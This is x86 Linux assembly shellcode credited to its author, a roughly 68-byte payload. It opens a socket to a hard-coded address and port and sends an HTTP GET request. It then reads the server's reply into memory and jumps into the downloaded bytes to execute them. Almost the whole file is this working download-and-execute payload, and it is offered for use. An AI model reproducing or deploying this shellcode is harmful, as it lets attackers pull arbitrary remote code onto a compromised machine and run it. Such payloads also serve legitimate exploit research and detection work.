#
# (x86/linux) HTTP/1.x GET, Downloads and JMP - 68+ bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

                push $0x66
                popl %eax
                cdq
                pushl $0x1
                popl %ebx
                pushl %edx
                pushl %ebx
                pushl $0x2
                movl %esp, %ecx
                int $0x80

                popl %ebx
                popl %ebp

                movl $0xfeffff80, %esi
                movw $0x1f91, %bp

		#
		# not %bp, for ports number that are < 256
		#

                notl %esi
                pushl %esi

                bswap %ebp
                orl %ebx, %ebp
                pushl %ebp

                incl %ebx
                pushl $0x10
                pushl %ecx
                pushl %eax
                movb $0x66, %al
                movl %esp, %ecx
                int $0x80

	_gen_http_request:

		#
		# < use gen_httpreq.c, to generate a HTTP GET request. >
		#

	_gen_http_eof:

		movl %esp, %ecx

	_send_http_request:

		movb $0x4, %al
		int $0x80
		
	_recv_http_request:

		movb $0x3, %al
		pushl $0x1
		popl %edx
		int $0x80
		incl %ecx
		testl %eax, %eax
		jnz _recv_http_request

	_jmp_to_code:

		subl $0x6, %ecx
		jmp *%ecx

